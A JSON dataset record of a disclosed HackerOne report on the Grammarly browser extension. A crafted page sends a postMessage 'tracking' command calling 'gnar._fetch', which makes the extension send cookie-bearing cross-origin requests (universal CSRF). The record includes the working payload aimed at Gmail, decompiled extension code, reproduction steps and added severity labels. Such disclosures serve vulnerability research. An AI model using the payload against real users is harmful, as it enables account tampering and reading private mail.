{
    "reported_to": "Grammarly",
    "reported_by": "metnew ",
    "title": "Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin",
    "content": "\nSummary:\nAttacker could trigger Grammarly extension's gnar._fetch command using a crafted page to perform XHR with cookies and any configurational params to any cross-origin resource.\nDescription:\nPage could Init Grammarly popup editor [no user gesture, helper]\nEvents have isTrusted property, which allows to determinate, whether current event is trusted(initiated by user). Grammarly popup editor could be initiated by page.\nAs I understood: injected content script could successfully emit events to background page only if popup was initiated earlier.\nThat means, attacker needs to initiate the popup somehow to communicate with background page through injected content script.\nNot sure about the root cause of this behavior. Probably, because popup is created by background page origin, that's why background page becomes accessible after this.\nSending commands to Grammarly content script\nActive page could send commands to injected Grammarly content script using window.postMessage.\nCommand structure:\nCode 129 Bytes\n1window.postMessage({\n2    grammarly: true,\n3    action: 'tracking',\n4    method: 'gnar._fetch',\n5    props: {}\n6    params: {}\n7}, \"*\")\nCommands handling in injected content script\nGrammarly content script \"parses\" commands using this snippet:\nCode 130 Bytes\n1function Z(e) {\n2    var t, n = e.action;\n3    ... \n4    \"tracking\" === n && e.method && g.call(e.method, e.param, e.props)\n5    ...\n6}\ntracking commands are later passed to this snippet:\nCode 133 Bytes\n1f.emitBackground(\"tracking-call\", {\n2    msg: e, // command's \"method\" field\n3    data: t // command's \"props\" + \"params\" fields\n4 }, s)\nThis f.emitBackground sends event to background page.\nCommands handling in extension's background page\nThe extension uses next snippet to handle tracking commands from content script:\nCode 865 Bytes\n1function w(e, t) { // t = params + props\n2    var n, a = o(e.split(\".\"), 2), // a = command's \"method\" field splitted by dot into array\n3        c = a[0],\n4        s = a[1];\n5    if (\"gnar\" === c) \n6        if (p.tracker.gnar)\n7            if (\"track\" === s) {\n8                var u = o(t, 2),\n9                    l = u[0], // \n10                    f = u[1];\n11                p.tracker.gnar.track(r({\n12                    eventName: g.gnarAppName + \"/\" + l // something not discovered yet \n13                }, f))\n14            } else\n15                p.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t)) : b.error(\n16                    \"gnar client does not have method '\" + s + \"' for '\" +\n17                    e + \"' in runMessage\");\n18    else b.error(\"gnar client not available for '\" + e + \"' in runMessage\");\n19    else b.error(\"unrecognized'\" + e + \"' in runMessage \")\n20}\np.tracker.gnar\nThat's an object with next structure:\nCode 647 Bytes\n1{\n2    _batchId: 8,\n3    _client: \"chromeExt\",\n4    _clientVersion: \"14.858.1756\",\n5    _containerIdManager: t {primaryStorage: t, secondaryStorages: Array(3), _logger: t, _metric: e,  _cacheSuccessTimeoutMillis: 1000, \u2026},\n6    _eventsUrl: \"https://gnar.grammarly.com/events\",\n7    _fetch: \u0192 (),\n8    _instanceId: \"nxIwqgPE\",\n9    _isTest: false,\n10    _isUserReady: true,\n11    _liteUrl: \"https://gnar.grammarly.com/lite\",\n12    _logger: t {name: \"gnar\", level: 2, context: e, appender: \u0192},\n13    _metric: t {name: \"gnar\", timersSink: \u0192, countersSink: \u0192, _fetch: \u0192, _sendTimeout: 7500, \u2026},\n14    _queue: [],\n15    _storePingTimestamp: true,\n16    _userId: \"701014151\n17}\nAdditionally, it has a set of methods.\nI guess p.tracker.gnar controls reporting telemetry events to Grammarly.\nAttacker-controllable function call\nCode 58 Bytes\n1p.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t))\ns = that's the second part of command's \"method\" field. E.g. \"method\": \"hello.grammarly\" -> s = 'grammarly'\nt = params and props\nThis snippet could be rewritten as:\nCode 57 Bytes\n1GNAR[methodsMethod].apply(GNAR,  toArray(paramsAndProps))\np.tracker.gnars .constructor and methods\np.tracker.gnar object could be overwritten using .constructor and .setUser methods those allow changing some p.tracker.gnar properties.\np.tracker.gnars .constructor\nCode 659 Bytes\n1function e(e, t, n, r, o, i, c, s) { // Attacker controls e and t params + non-listed params using `setUser`\n2            void 0 === s && (s = !1),\n3            this._client = t,\n4            this._clientVersion = n,\n5            this._fetch = r,\n6            this._containerIdManager = o,\n7            this._logger = i,\n8            this._metric = c,\n9            this._storePingTimestamp = s,\n10            this._instanceId = a.alphanumeric(8),\n11            this._batchId = 0,\n12            this._isUserReady = !1,\n13            this._queue = [],\n14            this._eventsUrl = e + \"/events\",\n15            this._liteUrl = e + \"/lite\",\n16            this._pingMaybe()\n17        }\ngnar.setUser/gnar._execQueue / gnar._send / gnar._doSend / gnar._enqueue\np.tracker.gnar has a set of interesting methods like setUser. Grammarly extension uses setUser to invalidate session.\nCode 115 Bytes\n1a[\"session-invalidate\"] = function (e, t, n, r, o) {\n2        ...\n3        s.call(\"gnar.setUser\", i, c)\n4        ...\n5}\nI'm not sure, but looks like calling this method with crafted payload may lead to incorrect userId in telemetry.\nTeam probably should know how much powerful listed above funcstions are.\n_fetch\np.tracker.gnar has _fetch property which points to fetch function.\nMore interesting is that, it's a polyfill, not a native function.\nI guess this polyfill isn't compliable to WHATWG fetch, because it allows making requests to data:/chrome-extension:/ origins.\nThat means, it's possible to call fetch() with attacker's params from the extension.\nCode 71 Bytes\n1p.tracker.gnar_fetch.apply(p.tracker.gnar, [\"FetchURL\", \"FetchParams\"])\nPage has to call window.postMessage with next object to call fetch from the extension\nCode 309 Bytes\n1x = window.top.postMessage({\n2    grammarly: true,\n3    action: 'tracking',\n4    method: 'gnar._fetch',\n5    props: { // FetchParams\n6        method: 'GET',\n7        headers: {\n8            'Content-Type': 'application/json'\n9        }\n10    },\n11    param: 'https://mail.google.com/mail/u/0/#inbox' // <FetchURL>\n12}, \"*\")\nXHR + cookies\nGrammarly extension has permissions to access all URLs and cookies from all origins.\nGrammarly makes all XHR requests with cookies -> it's possible for attacker to make blind requests with cookies to any origin.\n(except chrome://, however, chrome-extension:// is allowed because of polyfill for fetch).\nMore details in \"Impact\" section.\nBrowsers Verified In:\nChrome 70.0.3508.0 Canary\nChrome 68.0.3440.75 Stable\nGrammarly: 14.858.1756\nSteps To Reproduce:\nChange user's name in Grammarly\nOpen app-grammarly-csfr.html\nPage makes request to https://auth.grammarly.com/v3/user to change your name to \"Anonymous User\"\nGET Gmail as proof\nOpen Grammarly extension debug page in Chrome\nOpen get-request-to-gmail.html\nOpen \"Network\" tab in the debug page\nNote that extension made a GET request to Gmail (with cookies)\nOpen request preview\nNote that request includes your gmail content\nThat means, it's possible to initiate requests with cookies to any origin. Web applications without \"direct CSRF protection\" (e.g. hidden field with some value, not token in cookies ) are controllable by attacker.\nSupporting Material/References:\nScreencast for POST tohttps://auth.grammarly.com/v3/user. [1st PoC]\nScreencast to prove that Grammarly makes requests with cookies to cross-origin domains. [2nd PoC]\nI didn't know a good CSRF target, so I've recorded a second screencast with Gmail and GET request. I think that's enough to prove the vulnerability.\nImpact\nUniversal CSRF\nActually, \"Universal CSRF\" isn't a correct definition \ud83d\ude09. But I think it correctly expresses impact of the vulnerability.\nAttacker could trigger Grammarly extension's gnar._fetch command using crafted page to perform XHR with any configurational params to any origin [without user gesture].\nWeb applications without good protection against CSRF (hidden field in form, not cookies/origin check/etc.) are vulnerable to CSRF.\nPage could made any number of blind requests through Grammarly extension with cookies.\nOverwrite p.tracker.gnar and call any method of this object\np.tracker.gnar has a set of interesting methods like setUser. Grammarly extension uses setUser to invalidate session.\nI assume, calling this methods leads to sending invalid telemetry data to Grammarly.\nPossible UXSS via data manipulation\nAttacker could overwrite p.tracker.gnar with arbitrary data. However, postMessage doesn't allow to send non-clonable objects.\nAttacker could call something like:\nCode 50 Bytes\n1AnythingClonable.apply(Object, [AnythingClonable])\nI didn't test this with File/Blob/FileList non-clonnable objects. However, I think it's not possible to turn the snippet above into XSS.\nP.S: Grammarly, sorry for typos/mistakes if any. Your extension has some bugs at hackerone.com domain.\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": null,
    "weaknesses": [
        "None"
    ],
    "screenshots": {},
    "disclosed_date": 1564689540,
    "report_url": "https://hackerone.com/reports/389108",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Initiate Grammarly popup editor on a crafted page without user gesture"
        ],
        [
            2,
            "Use window.postMessage to send a crafted tracking command with method 'gnar._fetch' and arbitrary parameters to the Grammarly content script"
        ],
        [
            3,
            "Observe the Grammarly extension making arbitrary blind requests with user's cookies to any cross-origin resource"
        ]
    ],
    "vuln_description": "The vulnerability allows an attacker to trigger the Grammarly extension's gnar._fetch command via a crafted page, enabling arbitrary blind requests with the user's cookies to any cross-origin resource. This can lead to universal CSRF attacks, session manipulation, and potential data exfiltration.",
    "reason": "The attack involves multiple components (popup initiation, message passing, command execution) and requires understanding of the extension's internal tracking mechanism and the non-obvious interaction between the crafted page and the extension's background page. The manipulation of the extension's state to execute arbitrary fetch calls is also a subtle interaction.",
    "new_complexity": "HIGH",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}